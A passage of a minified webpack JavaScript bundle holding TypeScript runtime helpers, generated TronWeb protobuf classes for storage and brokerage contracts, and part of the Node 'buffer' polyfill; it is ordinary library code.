            function s(e, t) {
                var r = {};
                for (var n in e)
                    Object.prototype.hasOwnProperty.call(e, n) && t.indexOf(n) < 0 && (r[n] = e[n]);
                if (null != e && "function" === typeof Object.getOwnPropertySymbols) {
                    var o = 0;
                    for (n = Object.getOwnPropertySymbols(e); o < n.length; o++)
                        t.indexOf(n[o]) < 0 && Object.prototype.propertyIsEnumerable.call(e, n[o]) && (r[n[o]] = e[n[o]])
                }
                return r
            }
            function a(e, t, r, n) {
                var o, i = arguments.length, s = i < 3 ? t : null === n ? n = Object.getOwnPropertyDescriptor(t, r) : n;
                if ("object" === typeof Reflect && "function" === typeof Reflect.decorate)
                    s = Reflect.decorate(e, t, r, n);
                else
                    for (var a = e.length - 1; a >= 0; a--)
                        (o = e[a]) && (s = (i < 3 ? o(s) : i > 3 ? o(t, r, s) : o(t, r)) || s);
                return i > 3 && s && Object.defineProperty(t, r, s),
                s
            }
            function c(e, t) {
                return function(r, n) {
                    t(r, n, e)
                }
            }
            function l(e, t) {
                if ("object" === typeof Reflect && "function" === typeof Reflect.metadata)
                    return Reflect.metadata(e, t)
            }
            function u(e, t, r, n) {
                return new (r || (r = Promise))((function(o, i) {
                    function s(e) {
                        try {
                            c(n.next(e))
                        } catch (t) {
                            i(t)
                        }
                    }
                    function a(e) {
                        try {
                            c(n.throw(e))
                        } catch (t) {
                            i(t)
                        }
                    }
                    function c(e) {
                        var t;
                        e.done ? o(e.value) : (t = e.value,
                        t instanceof r ? t : new r((function(e) {
                            e(t)
                        }
                        ))).then(s, a)
                    }
                    c((n = n.apply(e, t || [])).next())
                }
                ))
            }
            function d(e, t) {
                var r, n, o, i, s = {
                    label: 0,
                    sent: function() {
                        if (1 & o[0])
                            throw o[1];
                        return o[1]
                    },
                    trys: [],
                    ops: []
                };
                return i = {
                    next: a(0),
                    throw: a(1),
                    return: a(2)
                },
                "function" === typeof Symbol && (i[Symbol.iterator] = function() {
                    return this
                }
                ),
                i;
                function a(i) {
                    return function(a) {
                        return function(i) {
                            if (r)
                                throw new TypeError("Generator is already executing.");
                            for (; s; )
                                try {
                                    if (r = 1,
                                    n && (o = 2 & i[0] ? n.return : i[0] ? n.throw || ((o = n.return) && o.call(n),
                                    0) : n.next) && !(o = o.call(n, i[1])).done)
                                        return o;
                                    switch (n = 0,
                                    o && (i = [2 & i[0], o.value]),
                                    i[0]) {
                                    case 0:
                                    case 1:
                                        o = i;
                                        break;
                                    case 4:
                                        return s.label++,
                                        {
                                            value: i[1],
                                            done: !1
                                        };
                                    case 5:
                                        s.label++,
                                        n = i[1],
                                        i = [0];
                                        continue;
                                    case 7:
                                        i = s.ops.pop(),
                                        s.trys.pop();
                                        continue;
                                    default:
                                        if (!(o = (o = s.trys).length > 0 && o[o.length - 1]) && (6 === i[0] || 2 === i[0])) {
                                            s = 0;
                                            continue
                                        }
                                        if (3 === i[0] && (!o || i[1] > o[0] && i[1] < o[3])) {
                                            s.label = i[1];
                                            break
                                        }
                                        if (6 === i[0] && s.label < o[1]) {
                                            s.label = o[1],
                                            o = i;
                                            break
                                        }
                                        if (o && s.label < o[2]) {
                                            s.label = o[2],
                                            s.ops.push(i);
                                            break
                                        }
                                        o[2] && s.ops.pop(),
                                        s.trys.pop();
                                        continue
                                    }
                                    i = t.call(e, s)
                                } catch (a) {
                                    i = [6, a],
                                    n = 0
                                } finally {
                                    r = o = 0
                                }
                            if (5 & i[0])
                                throw i[1];
                            return {
                                value: i[0] ? i[1] : void 0,
                                done: !0
                            }
                        }([i, a])
                    }
                }
            }
            function h(e, t, r, n) {
                void 0 === n && (n = r),
                e[n] = t[r]
            }
            function f(e, t) {
                for (var r in e)
                    "default" === r || t.hasOwnProperty(r) || (t[r] = e[r])
            }
            function p(e) {
                var t = "function" === typeof Symbol && Symbol.iterator
                  , r = t && e[t]
                  , n = 0;
                if (r)
                    return r.call(e);
                if (e && "number" === typeof e.length)
                    return {
                        next: function() {
                            return e && n >= e.length && (e = void 0),
                            {
                                value: e && e[n++],
                                done: !e
                            }
                        }
                    };
                throw new TypeError(t ? "Object is not iterable." : "Symbol.iterator is not defined.")
            }
            function g(e, t) {
                var r = "function" === typeof Symbol && e[Symbol.iterator];
                if (!r)
                    return e;
                var n, o, i = r.call(e), s = [];
                try {
                    for (; (void 0 === t || t-- > 0) && !(n = i.next()).done; )
                        s.push(n.value)
                } catch (a) {
                    o = {
                        error: a
                    }
                } finally {
                    try {
                        n && !n.done && (r = i.return) && r.call(i)
                    } finally {
                        if (o)
                            throw o.error
                    }
                }
                return s
            }
            function y() {
                for (var e = [], t = 0; t < arguments.length; t++)
                    e = e.concat(g(arguments[t]));
                return e
            }
            function m() {
                for (var e = 0, t = 0, r = arguments.length; t < r; t++)
                    e += arguments[t].length;
                var n = Array(e)
                  , o = 0;
                for (t = 0; t < r; t++)
                    for (var i = arguments[t], s = 0, a = i.length; s < a; s++,
                    o++)
                        n[o] = i[s];
                return n
            }
            function b(e) {
                return this instanceof b ? (this.v = e,
                this) : new b(e)
            }
            function v(e, t, r) {
                if (!Symbol.asyncIterator)
                    throw new TypeError("Symbol.asyncIterator is not defined.");
                var n, o = r.apply(e, t || []), i = [];
                return n = {},
                s("next"),
                s("throw"),
                s("return"),
                n[Symbol.asyncIterator] = function() {
                    return this
                }
                ,
                n;
                function s(e) {
                    o[e] && (n[e] = function(t) {
                        return new Promise((function(r, n) {
                            i.push([e, t, r, n]) > 1 || a(e, t)
                        }
                        ))
                    }
                    )
                }
                function a(e, t) {
                    try {
                        (r = o[e](t)).value instanceof b ? Promise.resolve(r.value.v).then(c, l) : u(i[0][2], r)
                    } catch (n) {
                        u(i[0][3], n)
                    }
                    var r
                }
                function c(e) {
                    a("next", e)
                }
                function l(e) {
                    a("throw", e)
                }
                function u(e, t) {
                    e(t),
                    i.shift(),
                    i.length && a(i[0][0], i[0][1])
                }
            }
            function w(e) {
                var t, r;
                return t = {},
                n("next"),
                n("throw", (function(e) {
                    throw e
                }
                )),
                n("return"),
                t[Symbol.iterator] = function() {
                    return this
                }
                ,
                t;
                function n(n, o) {
                    t[n] = e[n] ? function(t) {
                        return (r = !r) ? {
                            value: b(e[n](t)),
                            done: "return" === n
                        } : o ? o(t) : t
                    }
                    : o
                }
            }
            function T(e) {
                if (!Symbol.asyncIterator)
                    throw new TypeError("Symbol.asyncIterator is not defined.");
                var t, r = e[Symbol.asyncIterator];
                return r ? r.call(e) : (e = p(e),
                t = {},
                n("next"),
                n("throw"),
                n("return"),
                t[Symbol.asyncIterator] = function() {
                    return this
                }
                ,
                t);
                function n(r) {
                    t[r] = e[r] && function(t) {
                        return new Promise((function(n, o) {
                            (function(e, t, r, n) {
                                Promise.resolve(n).then((function(t) {
                                    e({
                                        value: t,
                                        done: r
                                    })
                                }
                                ), t)
                            }
                            )(n, o, (t = e[r](t)).done, t.value)
                        }
                        ))
                    }
                }
            }
            function A(e, t) {
                return Object.defineProperty ? Object.defineProperty(e, "raw", {
                    value: t
                }) : e.raw = t,
                e
            }
            function E(e) {
                if (e && e.__esModule)
                    return e;
                var t = {};
                if (null != e)
                    for (var r in e)
                        Object.hasOwnProperty.call(e, r) && (t[r] = e[r]);
                return t.default = e,
                t
            }
            function P(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            function C(e, t) {
                if (!t.has(e))
                    throw new TypeError("attempted to get private field on non-instance");
                return t.get(e)
            }
            function S(e, t, r) {
                if (!t.has(e))
                    throw new TypeError("attempted to set private field on non-instance");
                return t.set(e, r),
                r
            }
        }
        ,
        6228: (e, t, r) => {
            var n = r(7248)
              , o = n
              , i = "undefined" !== typeof globalThis && globalThis || "undefined" !== typeof window && window || "undefined" !== typeof i && i || "undefined" !== typeof self && self || function() {
                return this
            }
            .call(null) || Function("return this")();
            o.exportSymbol("TronWebProto.BuyStorageBytesContract", null, i),
            o.exportSymbol("TronWebProto.BuyStorageContract", null, i),
            o.exportSymbol("TronWebProto.SellStorageContract", null, i),
            o.exportSymbol("TronWebProto.UpdateBrokerageContract", null, i),
            TronWebProto.BuyStorageBytesContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.BuyStorageBytesContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.BuyStorageBytesContract.displayName = "TronWebProto.BuyStorageBytesContract"),
            TronWebProto.BuyStorageContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.BuyStorageContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.BuyStorageContract.displayName = "TronWebProto.BuyStorageContract"),
            TronWebProto.SellStorageContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.SellStorageContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.SellStorageContract.displayName = "TronWebProto.SellStorageContract"),
            TronWebProto.UpdateBrokerageContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.UpdateBrokerageContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.UpdateBrokerageContract.displayName = "TronWebProto.UpdateBrokerageContract"),
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.BuyStorageBytesContract.prototype.toObject = function(e) {
                return TronWebProto.BuyStorageBytesContract.toObject(e, this)
            }
            ,
            TronWebProto.BuyStorageBytesContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    bytes: n.Message.getFieldWithDefault(t, 2, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.BuyStorageBytesContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.BuyStorageBytesContract;
                return TronWebProto.BuyStorageBytesContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.BuyStorageBytesContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setBytes(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.BuyStorageBytesContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.BuyStorageBytesContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.BuyStorageBytesContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getBytes()) && t.writeInt64(2, r)
            }
            ,
            TronWebProto.BuyStorageBytesContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.BuyStorageBytesContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.BuyStorageBytesContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.BuyStorageBytesContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.BuyStorageBytesContract.prototype.getBytes = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.BuyStorageBytesContract.prototype.setBytes = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.BuyStorageContract.prototype.toObject = function(e) {
                return TronWebProto.BuyStorageContract.toObject(e, this)
            }
            ,
            TronWebProto.BuyStorageContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    quant: n.Message.getFieldWithDefault(t, 2, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.BuyStorageContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.BuyStorageContract;
                return TronWebProto.BuyStorageContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.BuyStorageContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setQuant(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.BuyStorageContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.BuyStorageContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.BuyStorageContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getQuant()) && t.writeInt64(2, r)
            }
            ,
            TronWebProto.BuyStorageContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.BuyStorageContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.BuyStorageContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.BuyStorageContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.BuyStorageContract.prototype.getQuant = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.BuyStorageContract.prototype.setQuant = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.SellStorageContract.prototype.toObject = function(e) {
                return TronWebProto.SellStorageContract.toObject(e, this)
            }
            ,
            TronWebProto.SellStorageContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    storageBytes: n.Message.getFieldWithDefault(t, 2, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.SellStorageContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.SellStorageContract;
                return TronWebProto.SellStorageContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.SellStorageContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setStorageBytes(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.SellStorageContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.SellStorageContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.SellStorageContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getStorageBytes()) && t.writeInt64(2, r)
            }
            ,
            TronWebProto.SellStorageContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.SellStorageContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.SellStorageContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.SellStorageContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.SellStorageContract.prototype.getStorageBytes = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.SellStorageContract.prototype.setStorageBytes = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.UpdateBrokerageContract.prototype.toObject = function(e) {
                return TronWebProto.UpdateBrokerageContract.toObject(e, this)
            }
            ,
            TronWebProto.UpdateBrokerageContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    brokerage: n.Message.getFieldWithDefault(t, 2, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.UpdateBrokerageContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.UpdateBrokerageContract;
                return TronWebProto.UpdateBrokerageContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.UpdateBrokerageContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readInt32();
                        e.setBrokerage(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.UpdateBrokerageContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.UpdateBrokerageContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.UpdateBrokerageContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getBrokerage()) && t.writeInt32(2, r)
            }
            ,
            TronWebProto.UpdateBrokerageContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.UpdateBrokerageContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.UpdateBrokerageContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.UpdateBrokerageContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.UpdateBrokerageContract.prototype.getBrokerage = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.UpdateBrokerageContract.prototype.setBrokerage = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            o.object.extend(t, TronWebProto)
        }
        ,
        6256: (e, t, r) => {
            const n = r(4950);
            e.exports = (e, t, r) => n(t, e, r)
        }
        ,
        6382: (e, t, r) => {
            "use strict";
            const n = r(4445)
              , o = r(6900)
              , i = "function" === typeof Symbol && "function" === typeof Symbol.for ? Symbol.for("nodejs.util.inspect.custom") : null;
            t.hp = c,
            t.IS = 50;
            const s = 2147483647;
            function a(e) {
                if (e > s)
                    throw new RangeError('The value "' + e + '" is invalid for option "size"');
                const t = new Uint8Array(e);
                return Object.setPrototypeOf(t, c.prototype),
                t
            }
            function c(e, t, r) {
                if ("number" === typeof e) {
                    if ("string" === typeof t)
                        throw new TypeError('The "string" argument must be of type string. Received type number');
                    return d(e)
                }
                return l(e, t, r)
            }
            function l(e, t, r) {
                if ("string" === typeof e)
                    return function(e, t) {
                        "string" === typeof t && "" !== t || (t = "utf8");
                        if (!c.isEncoding(t))
                            throw new TypeError("Unknown encoding: " + t);
                        const r = 0 | g(e, t);
                        let n = a(r);
                        const o = n.write(e, t);
                        o !== r && (n = n.slice(0, o));
                        return n
                    }(e, t);
                if (ArrayBuffer.isView(e))
                    return function(e) {
                        if (Z(e, Uint8Array)) {
                            const t = new Uint8Array(e);
                            return f(t.buffer, t.byteOffset, t.byteLength)
                        }
                        return h(e)
                    }(e);
                if (null == e)
                    throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof e);
                if (Z(e, ArrayBuffer) || e && Z(e.buffer, ArrayBuffer))
                    return f(e, t, r);
                if ("undefined" !== typeof SharedArrayBuffer && (Z(e, SharedArrayBuffer) || e && Z(e.buffer, SharedArrayBuffer)))
                    return f(e, t, r);
                if ("number" === typeof e)
                    throw new TypeError('The "value" argument must not be of type number. Received type number');
                const n = e.valueOf && e.valueOf();
                if (null != n && n !== e)
                    return c.from(n, t, r);
                const o = function(e) {
                    if (c.isBuffer(e)) {
                        const t = 0 | p(e.length)
                          , r = a(t);
                        return 0 === r.length || e.copy(r, 0, 0, t),
                        r
                    }
                    if (void 0 !== e.length)
                        return "number" !== typeof e.length || Y(e.length) ? a(0) : h(e);
                    if ("Buffer" === e.type && Array.isArray(e.data))
                        return h(e.data)
                }(e);
                if (o)
                    return o;
                if ("undefined" !== typeof Symbol && null != Symbol.toPrimitive && "function" === typeof e[Symbol.toPrimitive])
                    return c.from(e[Symbol.toPrimitive]("string"), t, r);
                throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof e)
            }
            function u(e) {
                if ("number" !== typeof e)
                    throw new TypeError('"size" argument must be of type number');
                if (e < 0)
                    throw new RangeError('The value "' + e + '" is invalid for option "size"')
            }
            function d(e) {
                return u(e),
                a(e < 0 ? 0 : 0 | p(e))
            }
            function h(e) {
                const t = e.length < 0 ? 0 : 0 | p(e.length)
                  , r = a(t);
                for (let n = 0; n < t; n += 1)
                    r[n] = 255 & e[n];
                return r
            }
            function f(e, t, r) {
                if (t < 0 || e.byteLength < t)
                    throw new RangeError('"offset" is outside of buffer bounds');
                if (e.byteLength < t + (r || 0))
                    throw new RangeError('"length" is outside of buffer bounds');
                let n;
                return n = void 0 === t && void 0 === r ? new Uint8Array(e) : void 0 === r ? new Uint8Array(e,t) : new Uint8Array(e,t,r),
                Object.setPrototypeOf(n, c.prototype),
                n
            }
            function p(e) {
                if (e >= s)
                    throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + s.toString(16) + " bytes");
                return 0 | e
            }
            function g(e, t) {
                if (c.isBuffer(e))
                    return e.length;
                if (ArrayBuffer.isView(e) || Z(e, ArrayBuffer))
                    return e.byteLength;
                if ("string" !== typeof e)
                    throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof e);
                const r = e.length
                  , n = arguments.length > 2 && !0 === arguments[2];
                if (!n && 0 === r)
                    return 0;
                let o = !1;
                for (; ; )
                    switch (t) {
                    case "ascii":
                    case "latin1":
                    case "binary":
                        return r;
                    case "utf8":
                    case "utf-8":
                        return G(e).length;
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return 2 * r;
                    case "hex":
                        return r >>> 1;
                    case "base64":
                        return $(e).length;
                    default:
                        if (o)
                            return n ? -1 : G(e).length;
                        t = ("" + t).toLowerCase(),
                        o = !0
                    }
            }
            function y(e, t, r) {
                let n = !1;
                if ((void 0 === t || t < 0) && (t = 0),
                t > this.length)
                    return "";
                if ((void 0 === r || r > this.length) && (r = this.length),
                r <= 0)
                    return "";
                if ((r >>>= 0) <= (t >>>= 0))
                    return "";
                for (e || (e = "utf8"); ; )
                    switch (e) {
                    case "hex":
                        return O(this, t, r);
                    case "utf8":
                    case "utf-8":
                        return S(this, t, r);
                    case "ascii":
                        return B(this, t, r);
                    case "latin1":
                    case "binary":
                        return x(this, t, r);
                    case "base64":
                        return C(this, t, r);
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return _(this, t, r);
                    default:
                        if (n)
                            throw new TypeError("Unknown encoding: " + e);
                        e = (e + "").toLowerCase(),
                        n = !0
                    }
            }
            function m(e, t, r) {
                const n = e[t];
                e[t] = e[r],
                e[r] = n
            }
            function b(e, t, r, n, o) {
                if (0 === e.length)
                    return -1;
                if ("string" === typeof r ? (n = r,
                r = 0) : r > 2147483647 ? r = 2147483647 : r < -2147483648 && (r = -2147483648),
                Y(r = +r) && (r = o ? 0 : e.length - 1),
                r < 0 && (r = e.length + r),
                r >= e.length) {
                    if (o)
                        return -1;
                    r = e.length - 1
                } else if (r < 0) {
                    if (!o)
                        return -1;
                    r = 0
                }
                if ("string" === typeof t && (t = c.from(t, n)),
                c.isBuffer(t))
                    return 0 === t.length ? -1 : v(e, t, r, n, o);
                if ("number" === typeof t)
                    return t &= 255,
                    "function" === typeof Uint8Array.prototype.indexOf ? o ? Uint8Array.prototype.indexOf.call(e, t, r) : Uint8Array.prototype.lastIndexOf.call(e, t, r) : v(e, [t], r, n, o);
                throw new TypeError("val must be string, number or Buffer")
            }
            function v(e, t, r, n, o) {
                let i, s = 1, a = e.length, c = t.length;
                if (void 0 !== n && ("ucs2" === (n = String(n).toLowerCase()) || "ucs-2" === n || "utf16le" === n || "utf-16le" === n)) {
                    if (e.length < 2 || t.length < 2)
                        return -1;
                    s = 2,
                    a /= 2,
                    c /= 2,
                    r /= 2
                }
                function l(e, t) {
                    return 1 === s ? e[t] : e.readUInt16BE(t * s)
                }
                if (o) {
                    let n = -1;
                    for (i = r; i < a; i++)
                        if (l(e, i) === l(t, -1 === n ? 0 : i - n)) {
                            if (-1 === n && (n = i),
                            i - n + 1 === c)
                                return n * s
                        } else
                            -1 !== n && (i -= i - n),
                            n = -1
                } else
                    for (r + c > a && (r = a - c),
                    i = r; i >= 0; i--) {
                        let r = !0;
                        for (let n = 0; n < c; n++)
                            if (l(e, i + n) !== l(t, n)) {
                                r = !1;
                                break
                            }
                        if (r)
                            return i
                    }
                return -1
            }
            function w(e, t, r, n) {
                r = Number(r) || 0;
                const o = e.length - r;
                n ? (n = Number(n)) > o && (n = o) : n = o;
                const i = t.length;
                let s;
                for (n > i / 2 && (n = i / 2),
                s = 0; s < n; ++s) {
                    const n = parseInt(t.substr(2 * s, 2), 16);
                    if (Y(n))
                        return s;
                    e[r + s] = n
                }
                return s
            }
            function T(e, t, r, n) {
                return K(G(t, e.length - r), e, r, n)
            }
            function A(e, t, r, n) {
                return K(function(e) {
                    const t = [];
                    for (let r = 0; r < e.length; ++r)
                        t.push(255 & e.charCodeAt(r));
                    return t
                }(t), e, r, n)
            }
            function E(e, t, r, n) {
                return K($(t), e, r, n)
            }
            function P(e, t, r, n) {
                return K(function(e, t) {
                    let r, n, o;
                    const i = [];
                    for (let s = 0; s < e.length && !((t -= 2) < 0); ++s)
                        r = e.charCodeAt(s),
                        n = r >> 8,
                        o = r % 256,
                        i.push(o),
                        i.push(n);
                    return i
                }(t, e.length - r), e, r, n)
            }
            function C(e, t, r) {
                return 0 === t && r === e.length ? n.fromByteArray(e) : n.fromByteArray(e.slice(t, r))
            }
            function S(e, t, r) {
                r = Math.min(e.length, r);
                const n = [];
                let o = t;
                for (; o < r; ) {
                    const t = e[o];
                    let i = null
                      , s = t > 239 ? 4 : t > 223 ? 3 : t > 191 ? 2 : 1;
                    if (o + s <= r) {
                        let r, n, a, c;
                        switch (s) {
                        case 1:
                            t < 128 && (i = t);
                            break;
                        case 2:
                            r = e[o + 1],
                            128 === (192 & r) && (c = (31 & t) << 6 | 63 & r,
                            c > 127 && (i = c));
                            break;
                        case 3:
                            r = e[o + 1],
                            n = e[o + 2],
                            128 === (192 & r) && 128 === (192 & n) && (c = (15 & t) << 12 | (63 & r) << 6 | 63 & n,
                            c > 2047 && (c < 55296 || c > 57343) && (i = c));
                            break;
                        case 4:
                            r = e[o + 1],
                            n = e[o + 2],
                            a = e[o + 3],
                            128 === (192 & r) && 128 === (192 & n) && 128 === (192 & a) && (c = (15 & t) << 18 | (63 & r) << 12 | (63 & n) << 6 | 63 & a,
                            c > 65535 && c < 1114112 && (i = c))
                        }
                    }
                    null === i ? (i = 65533,
                    s = 1) : i > 65535 && (i -= 65536,
                    n.push(i >>> 10 & 1023 | 55296),
                    i = 56320 | 1023 & i),
                    n.push(i),
                    o += s
                }
                return function(e) {
                    const t = e.length;
                    if (t <= I)
                        return String.fromCharCode.apply(String, e);
                    let r = ""
                      , n = 0;
                    for (; n < t; )
                        r += String.fromCharCode.apply(String, e.slice(n, n += I));
                    return r
                }(n)
            }
            c.TYPED_ARRAY_SUPPORT = function() {
                try {
                    const e = new Uint8Array(1)
                      , t = {
                        foo: function() {
                            return 42
                        }
                    };
                    return Object.setPrototypeOf(t, Uint8Array.prototype),
                    Object.setPrototypeOf(e, t),
                    42 === e.foo()
                } catch (e) {
                    return !1
                }
            }(),
            c.TYPED_ARRAY_SUPPORT || "undefined" === typeof console || "function" !== typeof console.error || console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."),
            Object.defineProperty(c.prototype, "parent", {
                enumerable: !0,
                get: function() {
                    if (c.isBuffer(this))
                        return this.buffer
                }
            }),
            Object.defineProperty(c.prototype, "offset", {
                enumerable: !0,
                get: function() {
                    if (c.isBuffer(this))
                        return this.byteOffset
                }
            }),
            c.poolSize = 8192,
            c.from = function(e, t, r) {
                return l(e, t, r)
            }
            ,
            Object.setPrototypeOf(c.prototype, Uint8Array.prototype),
            Object.setPrototypeOf(c, Uint8Array),
            c.alloc = function(e, t, r) {
                return function(e, t, r) {
                    return u(e),
                    e <= 0 ? a(e) : void 0 !== t ? "string" === typeof r ? a(e).fill(t, r) : a(e).fill(t) : a(e)
                }(e, t, r)
            }
            ,
            c.allocUnsafe = function(e) {
                return d(e)
            }
            ,
            c.allocUnsafeSlow = function(e) {
                return d(e)
            }
            ,
            c.isBuffer = function(e) {
                return null != e && !0 === e._isBuffer && e !== c.prototype
            }
            ,
            c.compare = function(e, t) {
                if (Z(e, Uint8Array) && (e = c.from(e, e.offset, e.byteLength)),
                Z(t, Uint8Array) && (t = c.from(t, t.offset, t.byteLength)),
                !c.isBuffer(e) || !c.isBuffer(t))
